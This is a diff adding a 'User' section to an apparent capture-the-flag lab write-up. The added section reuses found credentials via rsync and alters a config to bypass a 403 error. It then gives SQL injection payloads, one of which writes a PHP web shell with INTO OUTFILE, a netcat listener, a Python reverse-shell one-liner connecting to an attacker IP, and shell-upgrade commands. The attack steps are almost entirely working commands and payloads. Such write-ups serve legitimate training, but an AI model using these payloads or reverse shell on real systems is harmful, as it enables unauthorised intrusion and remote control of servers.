@@ -91,10 +91,7 @@ webapp.ini
 
 sent 255 bytes  received 194,360 bytes  389,230.00 bytes/sec
 total size is 193,430  speedup is 0.99
-
 ```
-
-In webapp.ini we can see a user and password for "tom".
 
 Post files
 
@@ -106,4 +103,64 @@ sending incremental file list
 sent 63 bytes  received 12 bytes  150.00 bytes/sec
 total size is 7  speedup is 0.09
 ```
+
+## User
+
+In webapp.ini we can see a user and password for "tom".  
+Change the "prod" to "dev" to bypass the 403 error.
+
+![image](https://user-images.githubusercontent.com/5285547/126405026-04e2a3da-4ff9-4b78-914a-91ed43b0979d.png)
+
+Then reuplaod the files
+
+```
+rsync -av ./ rsync://tom@10.10.55.140/Conf 
+```
+
+Now we can access the admin portal
+
+![image](https://user-images.githubusercontent.com/5285547/126405143-f5546a02-32e0-4712-9aaf-a65b7d5f052c.png)
+
+Playing with the application and testing a few things out.  
+I found it vunerable to Sqli
+
+
+payloads
+```
+tom" and 2=2 and ""="
+tom" union select 1,2,3-- -
+tom" UNION SELECT 1,"<?php echo shell_exec($_GET['cmd']);?>",2 INTO OUTFILE "/var/www/html/shell.php" -- '
+```
+
+Webshell 
+
+http://IP/admin/shell.php
+
+![image](https://user-images.githubusercontent.com/5285547/126406971-d222658d-3caf-46d1-98aa-f81644412ab5.png)
+![image](https://user-images.githubusercontent.com/5285547/126406986-7c4b4f69-2faa-48ea-a804-f8deb17ba55a.png)
+
+Lets get a reverse shell back. 
+Start a net cat listner
+
+```
+nc -lnvp 9999
+```
+
+```
+python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.8.153.120",9999));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
+```
+![image](https://user-images.githubusercontent.com/5285547/126407229-c24fc6c5-30d3-43ff-b245-d8f76db7e69d.png)
+
+Upgrade your term
+
+```
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+stty raw -echo;fg
+reset
+xterm
+
+export TERM=xterm;export SHELL=bash
+```
+
+
 
